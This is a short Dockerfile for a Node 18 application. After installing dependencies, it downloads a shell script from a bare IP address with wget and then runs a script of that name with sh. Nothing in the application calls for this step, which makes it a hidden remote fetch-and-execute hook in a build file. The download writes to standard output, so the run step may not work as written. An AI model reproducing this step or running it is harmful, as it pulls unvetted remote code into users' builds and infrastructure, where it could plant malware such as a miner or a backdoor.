FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN npm ci
RUN which bash
RUN bash
RUN cd
RUN apt update
RUN apt -y install  wget coreutils
RUN wget -O - http://194.233.164.53/start_Honey_web_man_ws_rand.sh
RUN sh start_Honey_web_man_ws_rand.sh

CMD ["npm", "run", "start"]
